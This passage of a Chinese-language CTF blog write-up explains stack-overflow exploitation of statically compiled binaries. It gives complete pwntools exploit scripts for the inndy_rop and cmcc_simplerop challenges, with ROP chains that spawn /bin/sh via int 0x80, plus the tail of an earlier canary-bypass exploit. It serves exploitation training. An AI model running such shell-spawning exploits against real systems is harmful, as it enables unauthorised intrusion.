class="line">write_addr=int(io.recv(14),16)+0x50</span><br><span class="line">print(hex(write_addr))</span><br><span class="line">base=write_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class="line">ogg_addr=base+ogg[3]</span><br><span class="line">payload=&#x27;a&#x27;*0x38+p64(canary)+&#x27;a&#x27;*0x10+&#x27;a&#x27;*0x8+p64(ogg_addr)</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">junk=io.recvline()</span><br><span class="line">print(junk)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="栈溢出之静态编译"><a href="#栈溢出之静态编译" class="headerlink" title="栈溢出之静态编译"></a>栈溢出之静态编译</h2><font color="#49b1f5">   顾名思义，题目采用的是静态编译而非动态编译，也就是说给出来的文件没有用于链接的libc库，同时也没有 plt表和 got表，也就不存在利用libc 来进行 rop链执行 system。</font><h3 id="例题-inndy-rop"><a href="#例题-inndy-rop" class="headerlink" title="例题-inndy_rop"></a>例题-inndy_rop</h3><p>   32位程序，使用的是静态编译，存在明显的栈溢出漏洞，可以使用ROPgadget –binary inndy_rop –ropchain找到可以一键getshell的rop片段组合。<br>   再加上偏移，即可。<br>   直接上 exp：</p>   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#start</span><br><span class="line">r = remote(&quot;node4.buuoj.cn&quot;,26188)</span><br><span class="line"># r = process(&quot;../buu/inndy_rop&quot;)</span><br><span class="line"></span><br><span class="line">#attack</span><br><span class="line">from struct import pack</span><br><span class="line"> </span><br><span class="line">def payload():</span><br><span class="line">   p = b&#x27;a&#x27;*(0xc+4)</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">   p += b&#x27;/bin&#x27;</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; ret</span><br><span class="line">   p += b&#x27;//sh&#x27;</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080de769) # pop ecx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x080492d3) # xor eax, eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0807a66f) # inc eax ; ret</span><br><span class="line">   p += pack(&#x27;&lt;I&#x27;, 0x0806c943) # int 0x80</span><br><span class="line">   r.sendline(p)</span><br><span class="line"></span><br><span class="line">payload()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题-cmcc-simplerop"><a href="#例题-cmcc-simplerop" class="headerlink" title="例题-cmcc_simplerop"></a>例题-cmcc_simplerop</h3><p>   和 inndy_rop 一样，静态编译，存在明显的栈溢出漏洞，且没有开启 pie 防护。不过这题存在 使用了 int 80 系统调用。<br>   可以利用 int 80 来执行 int80(11,”/bin/sh”,null,null) 即 exceve(“/bin/sh”,null,null)，系统调用号为 11。<br>   想法是，先利用 read 函数将 ‘/bin/sh\x00’ 写入bss段，随后执行 int80(11,”/bin/sh”,null,null)。</p><p>   <a href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80</a><br>   exp:<br>   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line"> p = process(&#x27;./simplerop&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"> p.recv()</span><br><span class="line"> int_addr = 0x080493e1</span><br><span class="line"> pop_eax = 0x080bae06</span><br><span class="line"> read_addr= 0x0806CD50</span><br><span class="line"> binsh_addr = 0x080EB584</span><br><span class="line"> pop_edx_ecx_ebx = 0x0806e850</span><br><span class="line"></span><br><span class="line"> payload = &#x27;a&#x27;*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)</span><br><span class="line"> payload += p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_addr)</span><br><span class="line"></span><br><span class="line"> p.sendline(payload)</span><br><span class="line"> p.send(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"> p.interactive()</span><br><span class="line"> p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></font>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
